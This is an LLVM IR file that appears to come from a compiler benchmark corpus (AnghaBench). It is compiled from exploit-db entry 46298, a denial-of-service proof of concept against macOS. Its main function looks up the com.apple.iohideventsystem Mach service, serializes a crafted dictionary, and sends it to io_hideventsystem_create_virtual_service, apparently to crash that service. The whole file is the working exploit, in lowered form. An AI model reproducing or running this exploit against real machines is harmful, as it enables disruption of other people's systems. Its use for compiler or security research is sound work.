; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_46298.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_46298.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MACH_PORT_NULL = common dso_local global i64 0, align 8
@bootstrap_port = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [27 x i8] c"com.apple.iohideventsystem\00", align 1
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [26 x i8] c"failed to lookup service\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [24 x i8] c"got service port: 0x%x\0A\00", align 1
@kCFTypeDictionaryKeyCallBacks = common dso_local global i32 0, align 4
@kCFTypeDictionaryValueCallBacks = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [4 x i8] c"key\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"value\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i64, i64* @MACH_PORT_NULL, align 8
  store i64 %12, i64* %7, align 8
  %13 = load i32, i32* @bootstrap_port, align 4
  %14 = call i64 @bootstrap_look_up(i32 %13, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0), i64* %7)
  store i64 %14, i64* %6, align 8
  %15 = load i64, i64* %6, align 8
  %16 = load i64, i64* @KERN_SUCCESS, align 8
  %17 = icmp ne i64 %15, %16
  br i1 %17, label %22, label %18

18:                                               ; preds = %2
  %19 = load i64, i64* %7, align 8
  %20 = load i64, i64* @MACH_PORT_NULL, align 8
  %21 = icmp eq i64 %19, %20
  br i1 %21, label %22, label %26

22:                                               ; preds = %18, %2
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0))
  %24 = load i32, i32* @EXIT_FAILURE, align 4
  %25 = call i32 @exit(i32 %24) #3
  unreachable

26:                                               ; preds = %18
  %27 = load i64, i64* %7, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i64 %27)
  %29 = call i32 @CFDictionaryCreateMutable(i32* null, i32 0, i32* @kCFTypeDictionaryKeyCallBacks, i32* @kCFTypeDictionaryValueCallBacks)
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  %31 = call i32 @CFSTR(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0))
  %32 = call i32 @CFSTR(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %33 = call i32 @CFDictionaryAddValue(i32 %30, i32 %31, i32 %32)
  store i64 0, i64* %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = call i32 @_IOHIDSerialize(i32 %34, i64* %9)
  store i32 %35, i32* %10, align 4
  %36 = load i32, i32* %8, align 4
  %37 = call i32 @CFRelease(i32 %36)
  store i32 0, i32* %11, align 4
  %38 = load i64, i64* %7, align 8
  %39 = load i64, i64* %9, align 8
  %40 = inttoptr i64 %39 to i8*
  %41 = load i32, i32* %10, align 4
  %42 = call i64 @io_hideventsystem_create_virtual_service(i64 %38, i8* %40, i32 %41, i32* %11)
  store i64 %42, i64* %6, align 8
  ret i32 0
}

declare dso_local i64 @bootstrap_look_up(i32, i8*, i64*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @CFDictionaryCreateMutable(i32*, i32, i32*, i32*) #1

declare dso_local i32 @CFDictionaryAddValue(i32, i32, i32) #1

declare dso_local i32 @CFSTR(i8*) #1

declare dso_local i32 @_IOHIDSerialize(i32, i64*) #1

declare dso_local i32 @CFRelease(i32) #1

declare dso_local i64 @io_hideventsystem_create_virtual_service(i64, i8*, i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
